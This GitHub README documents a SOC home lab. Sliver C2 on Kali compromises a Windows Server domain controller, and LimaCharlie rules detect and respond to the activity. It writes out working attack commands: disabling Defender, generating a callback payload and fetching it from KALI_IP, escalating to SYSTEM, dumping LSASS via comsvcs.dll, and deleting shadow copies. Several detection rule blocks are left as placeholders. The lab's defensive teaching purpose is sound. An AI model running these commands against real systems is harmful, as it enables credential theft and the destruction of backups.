# SOC Home Lab: C2 Attack Detection & Response with LimaCharlie

<div align="center">

[![LinkedIn](https://img.shields.io/badge/LinkedIn-ahmed%20alamin-blue)](https://www.linkedin.com/in/a-alaminhussain)
  
<img width="955" height="620" alt="SOC Home LAB Diagarm" src="https://github.com/user-attachments/assets/b6923b0b-7ef9-4ffd-ab24-35f391c01808" />
  
</div> 


## Lab Overview

This project demonstrates a Security Operations Center (SOC) lab environment for detecting and responding to real-world attacks using Sliver C2 and LimaCharlie EDR. The lab simulates an attacker compromising an Active Directory environment and performing common attack techniques like credential dumping and shadow copy deletion.

### Lab Architecture
- **Host Machine**: Running LimaCharlie EDR
- **VM 1**: Windows Server 2022 (Domain Controller) - Victim machine
- **VM 2**: Kali Linux - Attacker machine with Sliver C2
- **Network**: All machines on same subnet

## Prerequisites

- Virtualization software (VMware, VirtualBox, or Hyper-V)
- Windows Server 2022 ISO
- Kali Linux ISO
- LimaCharlie account
- Basic knowledge of AD environments and C2 frameworks

## Lab Setup

### Step 1: Virtual Machine Creation

Create two virtual machines:
- **Windows Server 2022**: Configure as Domain Controller
- **Kali Linux**: Attack machine with necessary tools

**Network Configuration**: Ensure both VMs are on the same network segment.
<div align="center">
<img width="1132" height="347" alt="image" src="https://github.com/user-attachments/assets/ccc9d4fc-1dc0-41c7-939a-fcc27b9cf8c5" />
</div>


### Step 2: Windows Security Configuration

Disable Windows Defender and SmartScreen to simulate enterprise environments where additional EDR solutions are deployed:

```powershell
# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable SmartScreen
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Type String -Value "Off"
```


### Step 3: LimaCharlie Configuration

1. Create a LimaCharlie account at [https://limacharlie.io](https://limacharlie.io)
2. Configure time synchronization across all machines
3. Install LimaCharlie sensor on Windows Server 2022
4. Verify sensor connectivity

<div align="center">
<img width="1391" height="581" alt="image" src="https://github.com/user-attachments/assets/727cfc9a-6b8e-4d63-9aaa-9fb96f258dfa" />
</div>

### Step 4: Event Verification

Verify that Windows events are being collected by LimaCharlie:
- Check the timeline for common Windows events
- Confirm sensor is sending data successfully

<div align="center">
<img width="1373" height="649" alt="image" src="https://github.com/user-attachments/assets/b5a15519-47cf-4c71-939e-ab7ffd2a7e63" />
</div>

## Attack Scenario 1: Credential Dumping via LSASS

### Step 5: Sliver C2 Setup

On Kali Linux, install and configure Sliver C2:

```bash
# Install Sliver
curl https://sliver.sh/install|bash

# Start Sliver C2 server
sliver-server
```

<div align="center">
<img width="578" height="250" alt="image" src="https://github.com/user-attachments/assets/d7d95946-38b3-47d1-85d1-7e094a8defdd" />
</div>

### Step 6: Payload Generation and Delivery

Generate a Windows payload and host it on an HTTP server:

```bash
# Generate Windows executable
generate --os windows --arch amd64 --http http://KALI_IP:8080

# Start HTTP server
websites --content . --website default
```


### Step 7: Payload Execution

On Windows Server 2022, download and execute the payload:

```powershell
# Download payload from Kali HTTP server
Invoke-WebRequest -Uri "http://KALI_IP:8080/sliver.exe" -OutFile "C:\Windows\Temp\sliver.exe"

# Execute the payload
Start-Process "C:\Windows\Temp\sliver.exe"
```

<img width="749" height="120" alt="1-sliver session created2" src="https://github.com/user-attachments/assets/a1875f3b-1e23-4769-b1c5-37aa171c5b98" />



### Step 8: Privilege Escalation

In the Sliver console, escalate privileges to SYSTEM:

```bash
# List sessions
sessions

# Escalate to SYSTEM (replace SESSION_ID with actual session)
use SESSION_ID
getsystem
```

<img width="747" height="267" alt="2-upgraded session to system" src="https://github.com/user-attachments/assets/0a215e7b-c63b-43f3-8729-8b7c00ede4e5" />


### Step 9: LSASS Dump Attack

Dump LSASS memory to obtain credential material:

```bash
# List processes to find LSASS PID
ps

# Dump LSASS process (replace PID with actual LSASS PID)
execute C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Tmp\lsass.dmp full
```

**Alternative command if comsvcs.dll not found:**
```bash
execute C:\\Windows\\SysWOW64\\rundll32.exe C:\\Windows\\SysWOW64\\comsvcs.dll, MiniDump <PID> C:\\Windows\\Tmp\\lsass.dmp full
```

<img width="742" height="72" alt="3-lsassDump" src="https://github.com/user-attachments/assets/76e09612-4308-4d97-9d9c-c54297ee06c3" />

<img width="621" height="273" alt="4-lsass dumb" src="https://github.com/user-attachments/assets/6f54c188-1a28-4227-a986-3e09889d112e" />


### Step 10: Event Analysis in LimaCharlie

Locate the LSASS dump event in LimaCharlie timeline:
- Look for process creation events involving rundll32 and comsvcs.dll
- Identify the MiniDump parameter usage

<img width="1339" height="609" alt="4-find the event and build a DR rule" src="https://github.com/user-attachments/assets/8e8d08c3-c3dd-4e49-bb50-2c92e20ecf1d" />


## Detection & Response Rule 1: LSASS Dumping

### Step 11: Create Detection Rule

In LimaCharlie, create a detection rule for LSASS dumping:

```yaml
# DETECTION RULE FOR LSASS DUMPING - COPY PASTE BELOW
# [PASTE YOUR DETECTION RULE HERE]

# Example structure:
name: "LSASS Memory Dump Detection"
description: "Detects attempts to dump LSASS memory using comsvcs.dll"
events:
  - op: is
    path: event/OP
    value: 1
  - op: contains
    path: event/PATH
    value: comsvcs.dll
  - op: contains
    path: event/COMMAND_LINE
    value: MiniDump
```

<img width="1267" height="199" alt="5-testevent_detection" src="https://github.com/user-attachments/assets/1ad9efce-3904-47ed-a503-804410d9eeca" />


### Step 12: Test Detection

Execute the LSASS dump attack again and verify the detection triggers:

<img width="1394" height="625" alt="6-detection working" src="https://github.com/user-attachments/assets/4ed3b3a0-64df-4e06-9549-df1fe20c407f" />


## Attack Scenario 2: Shadow Copy Deletion

### Step 13: Create Windows Native Shell

In Sliver, create a native Windows shell to execute shadow copy deletion:

```bash
# Use existing session or create new one
use SESSION_ID

# Spawn Windows native shell
shell

# Delete all shadow copies
vssadmin delete shadows /all
```

<img width="1355" height="355" alt="image" src="https://github.com/user-attachments/assets/5d831e5e-29f6-43a4-ab3c-c8df7e72603b" />


### Step 14: Event Analysis

Locate the shadow copy deletion event in LimaCharlie timeline:
- Look for vssadmin process execution
- Identify the "delete shadows" command

<img width="1156" height="636" alt="8  limacharlie shadowcopy event" src="https://github.com/user-attachments/assets/e67910e4-a18a-40c5-9c91-2e19360ded18" />


## Detection & Response Rule 2: Shadow Copy Deletion

### Step 15: Create Detection with Response

Create a detection rule for shadow copy deletion with automated response:

```yaml
# DETECTION RULE FOR SHADOW COPY DELETION - COPY PASTE BELOW
# [PASTE YOUR DETECTION RULE HERE]

# RESPONSE ACTION - COPY PASTE BELOW  
# [PASTE YOUR RESPONSE ACTION HERE]

# Example response structure:
- action: task
  command: kill
  investigation_id: "{{routing/investigation_id}}"
  op: and
  predicates:
    - op: is
      path: event/PID
      value: "{{event/PID}}"
```

### Step 16: Test Detection and Response

Execute the shadow copy deletion command and verify:
- Detection rule triggers
- Parent process is automatically terminated
- Shell session ends

<img width="1125" height="665" alt="9-shadowcopy detection worked and parent delted" src="https://github.com/user-attachments/assets/882cfcf7-3d86-4fd1-b2a0-0944c73a4f93" />


## Detection Rules

### LSASS Dumping Detection
```yaml
# [FINAL LSASS DUMP DETECTION RULE - PASTE YOUR ACTUAL RULE HERE]
```

### Shadow Copy Deletion Detection & Response
```yaml
# [FINAL SHADOW COPY DETECTION RULE - PASTE YOUR ACTUAL RULE HERE]

# [FINAL RESPONSE ACTION - PASTE YOUR ACTUAL RESPONSE HERE]
```

## Analysis Notes

### Key Attack Indicators
1. **LSASS Dumping**: 
   - Rundll32.exe loading comsvcs.dll with MiniDump parameter
   - File creation in unusual locations (C:\Windows\Tmp\)
   - Process access to lsass.exe

2. **Shadow Copy Deletion**:
   - vssadmin.exe with "delete shadows" parameter
   - Typically associated with ransomware preparation
   - Parent process termination is effective response

### SOC Analyst Actions
- Monitor for these specific command-line parameters
- Implement automated response for high-confidence alerts
- Correlate with other suspicious activity

## Conclusion

This lab demonstrates:
- Real-world attack techniques using modern C2 frameworks
- Effective detection engineering with LimaCharlie
- Automated response actions to contain threats
- SOC workflow for attack analysis and rule creation

The detection rules created can be refined and expanded for production environments with additional contextual filtering to reduce false positives.

## Troubleshooting

**Common Issues:**
- LimaCharlie sensor not reporting: Check network connectivity and sensor configuration
- Sliver payload not executing: Verify AV exclusions and payload architecture
- Detection rules not firing: Validate event patterns and rule logic

## References

- [LimaCharlie Documentation](https://doc.limacharlie.io)
- [Sliver C2 Documentation](https://github.com/BishopFox/sliver/wiki)
- [MITRE ATT&CK: Credential Dumping](https://attack.mitre.org/techniques/T1003/)
- [MITRE ATT&CK: Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)

---

*This lab is for educational purposes only. Always ensure you have proper authorization before conducting security testing.*
